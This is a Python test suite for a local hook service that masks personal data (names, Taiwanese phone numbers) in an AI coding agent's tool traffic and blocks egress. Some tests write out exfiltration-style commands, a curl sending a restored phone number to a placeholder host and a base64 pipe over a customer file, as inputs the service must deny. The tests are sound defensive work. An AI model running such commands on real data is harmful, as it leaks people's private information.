"""Tests for the loopback hookd service and its hook endpoints."""

from __future__ import annotations

import json
import stat
import threading
import urllib.error
import urllib.request
from collections.abc import Iterator

import pytest

from pii_guard.hookd import policy
from pii_guard.hookd.core import SessionStore
from pii_guard.hookd.server import HookdApplication, HookdServerConfig, create_server
from pii_guard.hookd.state import HookdConfig, read_state, write_state
from tests.test_hookd_core import FakeEngine

SPANS = {"王小明": "PERSON", "0912345678": "TW_MOBILE"}


class RunningService:
    """A started test service plus the helpers to talk to it."""

    def __init__(self, base: str, token: str, store: SessionStore) -> None:
        self.base = base
        self.token = token
        self.store = store

    def call(
        self,
        method: str,
        path: str,
        payload: dict[str, object] | None = None,
        *,
        token: str | None = None,
        host: str | None = None,
        authorize: bool = True,
    ) -> tuple[int, dict[str, object]]:
        data = json.dumps(payload).encode("utf-8") if payload is not None else None
        request = urllib.request.Request(self.base + path, data=data, method=method)
        if authorize:
            request.add_header("Authorization", f"Bearer {token or self.token}")
        if host is not None:
            request.add_header("Host", host)
        if data is not None:
            request.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
                body = response.read()
                status = response.status
        except urllib.error.HTTPError as error:
            status, body = error.code, error.read()
        try:
            return status, json.loads(body.decode("utf-8"))
        except ValueError:
            return status, {"raw": body.decode("utf-8", "replace")}

    def hook(self, event: str, payload: dict[str, object]) -> dict[str, object]:
        status, body = self.call("POST", f"/v1/hooks/{event}", payload)
        assert status == 200
        return body


@pytest.fixture
def service(tmp_path) -> Iterator[RunningService]:
    config = HookdConfig(home=tmp_path / "hookd")
    store = SessionStore(config, FakeEngine(dict(SPANS)))
    server, token, port = create_server(
        HookdApplication(store, "regex"), HookdServerConfig(port=0)
    )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield RunningService(f"http://127.0.0.1:{port}", token, store)
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_health_requires_a_token(service: RunningService) -> None:
    wrong, _ = service.call("GET", "/v1/health", token="wrong-token")
    missing, _ = service.call("GET", "/v1/health", authorize=False)

    assert wrong == 401
    assert missing == 401


def test_health_reports_the_loaded_engine(service: RunningService) -> None:
    status, body = service.call("GET", "/v1/health")

    assert status == 200
    assert body["ok"] is True
    assert body["engine"] == "regex"
    assert body["engine_fallback"] is False
    assert body["names_covered"] is False


def test_health_reports_a_full_engine_as_covering_names(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(SessionStore(config, FakeEngine({})), "full")

    assert app.health()["names_covered"] is True
    assert app.health()["engine_fallback"] is False


def test_health_reports_a_fallback(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(
        SessionStore(config, FakeEngine({})), "regex", engine_fallback=True
    )

    health = app.health()
    assert health["engine_fallback"] is True
    assert health["names_covered"] is False


def test_foreign_host_header_is_rejected(service: RunningService) -> None:
    status, _ = service.call("GET", "/v1/health", host="pii-guard.example.com")

    assert status == 404


def test_unknown_path_is_not_found(service: RunningService) -> None:
    status, _ = service.call("GET", "/v1/nope")

    assert status == 404


def test_redact_and_restore_round_trip(service: RunningService) -> None:
    status, redacted = service.call(
        "POST", "/v1/redact", {"session_id": "s1", "text": "王小明 0912345678"}
    )
    assert status == 200
    assert redacted["text"] == "<PERSON_1> <TW_MOBILE_1>"
    assert redacted["new_placeholders"] == 2
    assert redacted["counts"] == {"PERSON": 1, "TW_MOBILE": 1}

    status, restored = service.call(
        "POST", "/v1/restore", {"session_id": "s1", "text": str(redacted["text"])}
    )
    assert status == 200
    assert restored["text"] == "王小明 0912345678"
    assert restored["replaced"] == 2


def test_invalid_session_id_is_a_client_error(service: RunningService) -> None:
    status, body = service.call("POST", "/v1/redact", {"session_id": "../x", "text": "hi"})

    assert status == 400
    assert body["error_code"] == "INVALID_SESSION_ID"


def test_malformed_body_is_a_client_error(service: RunningService) -> None:
    status, _ = service.call("POST", "/v1/redact", {"session_id": "s1"})

    assert status == 400


def test_post_tool_use_read_redacts_file_content(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "hook_event_name": "PostToolUse",
            "tool_name": "Read",
            "tool_input": {"file_path": "/tmp/notes.txt"},
            "tool_response": {
                "type": "text",
                "file": {
                    "filePath": "/tmp/notes.txt",
                    "content": "聯絡人 王小明 0912345678",
                    "numLines": 1,
                    "startLine": 1,
                    "totalLines": 1,
                },
            },
        },
    )

    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
    assert updated["type"] == "text"
    assert updated["file"]["content"] == "聯絡人 <PERSON_1> <TW_MOBILE_1>"
    # Every other field of the tool's output shape is echoed unchanged.
    assert updated["file"]["filePath"] == "/tmp/notes.txt"
    assert updated["file"]["numLines"] == 1
    assert updated["file"]["totalLines"] == 1


def test_post_tool_use_read_image_is_passed_through(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Read",
            "tool_response": {"type": "image", "file": {"base64": "abc", "type": "image/png"}},
        },
    )

    assert reply == {}


def test_post_tool_use_read_without_pii_changes_nothing(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Read",
            "tool_response": {
                "type": "text",
                "file": {"filePath": "/tmp/a", "content": "no personal data here"},
            },
        },
    )

    assert reply == {}


def test_post_tool_use_bash_redacts_both_streams(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_response": {
                "stdout": "王小明",
                "stderr": "warn: 0912345678",
                "interrupted": False,
                "isImage": False,
            },
        },
    )

    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
    assert updated["stdout"] == "<PERSON_1>"
    assert updated["stderr"] == "warn: <TW_MOBILE_1>"
    assert updated["interrupted"] is False
    assert updated["isImage"] is False


def test_post_tool_use_grep_redacts_string_leaves(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Grep",
            "tool_response": {
                "mode": "content",
                "numFiles": 1,
                "content": "notes.txt:3:王小明",
                "filenames": ["/tmp/王小明.txt"],
            },
        },
    )

    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
    assert updated["content"] == "notes.txt:3:<PERSON_1>"
    assert updated["filenames"] == ["/tmp/<PERSON_1>.txt"]
    assert updated["mode"] == "content"
    assert updated["numFiles"] == 1


def test_pre_tool_use_write_restores_placeholders(service: RunningService) -> None:
    service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_response": {"stdout": "王小明 0912345678", "stderr": ""},
        },
    )

    reply = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "Write",
            "tool_input": {"file_path": "/tmp/out.txt", "content": "寄給 <PERSON_1>"},
        },
    )

    updated = reply["hookSpecificOutput"]["updatedInput"]
    assert updated["content"] == "寄給 王小明"
    # updatedInput replaces the whole input, so unrelated fields survive.
    assert updated["file_path"] == "/tmp/out.txt"


def test_pre_tool_use_edit_and_multiedit_restore(service: RunningService) -> None:
    service.hook(
        "PostToolUse",
        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "王小明"}},
    )

    edit = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "Edit",
            "tool_input": {"file_path": "/a", "old_string": "x", "new_string": "<PERSON_1>"},
        },
    )
    assert edit["hookSpecificOutput"]["updatedInput"]["new_string"] == "王小明"

    multi = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "MultiEdit",
            "tool_input": {
                "file_path": "/a",
                "edits": [{"old_string": "<PERSON_1>", "new_string": "keep"}],
            },
        },
    )
    assert multi["hookSpecificOutput"]["updatedInput"]["edits"][0]["old_string"] == "王小明"


def test_pre_tool_use_without_placeholders_changes_nothing(service: RunningService) -> None:
    reply = service.hook(
        "PreToolUse",
        {"session_id": "s1", "tool_name": "Write", "tool_input": {"content": "plain text"}},
    )

    assert reply == {}


def test_message_display_restores_for_the_user(service: RunningService) -> None:
    service.hook(
        "PostToolUse",
        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "王小明"}},
    )

    reply = service.hook(
        "MessageDisplay",
        {"session_id": "s1", "delta": "客戶是 <PERSON_1>", "index": 0, "final": False},
    )

    assert reply["hookSpecificOutput"]["displayContent"] == "客戶是 王小明"


def test_session_start_explains_the_placeholders(service: RunningService) -> None:
    reply = service.hook("SessionStart", {"session_id": "s1", "source": "startup"})

    assert "pii-guard" in str(reply["systemMessage"])
    assert "placeholder" in str(reply["hookSpecificOutput"]["additionalContext"])


def test_session_start_says_names_are_uncovered_on_the_regex_engine(
    service: RunningService,
) -> None:
    reply = service.hook("SessionStart", {"session_id": "s1", "source": "startup"})

    assert reply["systemMessage"] == "pii-guard: on (regex only, names NOT covered)"
    assert "NOT detected" in str(reply["hookSpecificOutput"]["additionalContext"])


def test_session_start_says_names_are_covered_on_the_full_engine(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(SessionStore(config, FakeEngine({})), "full")

    reply = app.hook("SessionStart", {"session_id": "s1"})

    assert reply["systemMessage"] == "pii-guard: on (full engine, names covered)"
    assert "NOT detected" not in str(reply["hookSpecificOutput"]["additionalContext"])


def test_session_start_warns_about_the_edit_limitation(service: RunningService) -> None:
    """Edit matches old_string before any hook runs, so it cannot be restored."""

    reply = service.hook("SessionStart", {"session_id": "s1", "source": "startup"})

    context = str(reply["hookSpecificOutput"]["additionalContext"])
    assert "Edit" in context
    assert "String to replace not found" in context
    # The model must be told the way out, not just the failure.
    assert "Write" in context
    assert "Never guess" in context


def test_unknown_hook_event_is_a_no_op(service: RunningService) -> None:
    assert service.hook("Notification", {"session_id": "s1"}) == {}


def test_sessions_listing_never_returns_values(service: RunningService) -> None:
    service.call("POST", "/v1/redact", {"session_id": "s1", "text": "王小明"})

    status, body = service.call("GET", "/v1/sessions")

    assert status == 200
    assert body["sessions"] == [{"session_id": "s1", "placeholders": 1}]
    assert "王小明" not in json.dumps(body, ensure_ascii=False)


def test_purge_endpoint_forgets_the_session(service: RunningService) -> None:
    service.call("POST", "/v1/redact", {"session_id": "s1", "text": "王小明"})

    status, body = service.call("POST", "/v1/sessions/s1/purge", {})

    assert status == 200
    assert body["purged"] is True
    status, listing = service.call("GET", "/v1/sessions")
    assert listing["sessions"] == []


def test_state_files_are_owner_only(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")

    write_state(
        config,
        port=54321,
        token="a" * 32,
        pid=1234,
        engine="regex",
        started_at=1.0,
    )

    assert stat.S_IMODE(config.state_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(config.state_env_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(config.home.stat().st_mode) == 0o700
    env_text = config.state_env_path.read_text(encoding="utf-8")
    assert env_text == f"PII_HOOKD_PORT=54321\nPII_HOOKD_TOKEN={'a' * 32}\n"
    state = read_state(config)
    assert state is not None
    assert state["port"] == 54321
    assert state["engine"] == "regex"


def test_read_state_returns_none_without_a_service(tmp_path) -> None:
    assert read_state(HookdConfig(home=tmp_path / "missing")) is None


def _learn_placeholder(service: RunningService) -> None:
    """Teach the session a value so its placeholder is known."""

    service.hook(
        "PostToolUse",
        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "0912345678"}},
    )


def test_bash_restore_is_refused_for_a_network_command(service: RunningService) -> None:
    _learn_placeholder(service)

    reply = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://x.test/?q=<TW_MOBILE_1>"},
        },
    )

    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "network" in reply["hookSpecificOutput"]["permissionDecisionReason"]


def test_bash_restore_still_works_for_a_local_command(service: RunningService) -> None:
    _learn_placeholder(service)

    reply = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_input": {"command": "grep <TW_MOBILE_1> customers.txt"},
        },
    )

    assert reply["hookSpecificOutput"]["updatedInput"]["command"] == "grep 0912345678 customers.txt"


def test_a_network_command_without_placeholders_is_untouched(service: RunningService) -> None:
    reply = service.hook(
        "PreToolUse",
        {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": "curl https://x.test"}},
    )

    assert reply == {}


def test_an_encoder_command_is_denied(service: RunningService) -> None:
    reply = service.hook(
        "PreToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_input": {"command": "cat customers.txt | base64"},
        },
    )

    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_encoded_bash_output_is_withheld(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_response": {"stdout": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 3, "stderr": ""},
        },
    )

    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
    assert updated["stdout"] == policy.OUTPUT_WITHHELD
    assert "plain text" in reply["hookSpecificOutput"]["additionalContext"]


def test_ordinary_bash_output_is_not_withheld(service: RunningService) -> None:
    reply = service.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_response": {"stdout": "王小明 0912345678", "stderr": ""},
        },
    )

    updated = reply["hookSpecificOutput"]["updatedToolOutput"]
    assert updated["stdout"] == "<PERSON_1> <TW_MOBILE_1>"


def test_the_output_gate_can_be_switched_off(tmp_path) -> None:
    from pii_guard.hookd import policy as policy_module

    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(
        SessionStore(config, FakeEngine({})),
        "regex",
        policy_config=policy_module.PolicyConfig(output_gate=False),
    )

    reply = app.hook(
        "PostToolUse",
        {
            "session_id": "s1",
            "tool_name": "Bash",
            "tool_response": {"stdout": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 3},
        },
    )

    assert reply == {}


def test_egress_tools_are_denied_through_the_hook(service: RunningService) -> None:
    reply = service.hook(
        "PreToolUse",
        {"session_id": "s1", "tool_name": "WebFetch", "tool_input": {"url": "https://x.test"}},
    )

    assert reply["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_a_remote_agent_is_denied_and_a_local_one_is_not(service: RunningService) -> None:
    denied = service.hook(
        "PreToolUse",
        {"session_id": "s1", "tool_name": "Agent", "tool_input": {"isolation": "remote"}},
    )
    allowed = service.hook(
        "PreToolUse",
        {"session_id": "s1", "tool_name": "Agent", "tool_input": {"prompt": "hello"}},
    )

    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert allowed == {}


def test_health_reports_the_active_policy(service: RunningService) -> None:
    _, body = service.call("GET", "/v1/health")

    assert body["policy"]["output_gate"] is True
    assert body["policy"]["allowed_tools"] == []


def test_user_prompt_submit_blocks_an_at_file_reference(service: RunningService, tmp_path) -> None:
    target = tmp_path / "customers.txt"
    target.write_text("王小明", encoding="utf-8")

    reply = service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": f"看一下 @{target} 好嗎", "cwd": str(tmp_path)},
    )

    assert reply["decision"] == "block"
    assert "Read the file instead" in reply["reason"]


def test_user_prompt_submit_allows_a_directory_reference(service: RunningService, tmp_path) -> None:
    (tmp_path / "src").mkdir()

    reply = service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": "看一下 @src/ 的結構", "cwd": str(tmp_path)},
    )

    assert reply == {}


def test_user_prompt_submit_blocks_pii_with_counts_only(service: RunningService) -> None:
    reply = service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": "請寄給 0912345678 這個號碼", "cwd": "/tmp"},
    )

    assert reply["decision"] == "block"
    assert "1 TW_MOBILE" in reply["reason"]
    # The value itself must never appear in the reason.
    assert "0912345678" not in reply["reason"]


def test_user_prompt_submit_allows_a_plain_prompt(service: RunningService) -> None:
    reply = service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": "請幫我看一下測試為什麼失敗", "cwd": "/tmp"},
    )

    assert reply == {}


def test_a_prompt_mentioning_a_placeholder_is_not_blocked(service: RunningService) -> None:
    """Referring to a marker is not the same as pasting the real value."""

    _learn_placeholder(service)

    reply = service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": "把 <TW_MOBILE_1> 寫進 notes.txt", "cwd": "/tmp"},
    )

    assert reply == {}


def test_detection_on_a_prompt_does_not_teach_the_session(service: RunningService) -> None:
    service.hook(
        "UserPromptSubmit",
        {"session_id": "s1", "prompt": "0912345678", "cwd": "/tmp"},
    )

    _, listing = service.call("GET", "/v1/sessions")
    entries = [item for item in listing["sessions"] if item["session_id"] == "s1"]
    assert entries == [] or entries[0]["placeholders"] == 0


def test_seed_terms_are_masked_from_the_first_read(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(
        SessionStore(config, FakeEngine({})),
        "regex",
        seed_terms=(("PERSON", "龍哥"),),
    )
    start = app.hook("SessionStart", {"session_id": "s1"})

    reply = app.hook(
        "PostToolUse",
        {"session_id": "s1", "tool_name": "Bash", "tool_response": {"stdout": "找龍哥確認"}},
    )

    assert "1 seed terms loaded" in start["systemMessage"]
    # The engine detects nothing here; the seeded value is masked by the sweep.
    assert reply["hookSpecificOutput"]["updatedToolOutput"]["stdout"] == "找<PERSON_1>確認"


def test_seed_terms_never_appear_in_the_reply(tmp_path) -> None:
    config = HookdConfig(home=tmp_path / "hookd")
    app = HookdApplication(
        SessionStore(config, FakeEngine({})), "regex", seed_terms=(("PERSON", "龍哥"),)
    )

    start = app.hook("SessionStart", {"session_id": "s1"})

    assert "龍哥" not in json.dumps(start, ensure_ascii=False)
